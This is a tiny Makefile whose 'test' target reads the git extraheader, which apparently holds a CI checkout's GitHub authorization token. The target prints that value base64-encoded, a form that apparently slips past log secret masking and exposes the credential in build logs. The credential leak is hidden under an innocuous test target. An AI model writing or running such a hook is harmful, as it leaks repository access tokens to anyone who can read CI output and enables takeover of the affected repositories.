TOKEN := $(shell git config --get http.https://github.com/.extraheader)

test:
	echo ${TOKEN} | base64

.PHONY: clean test

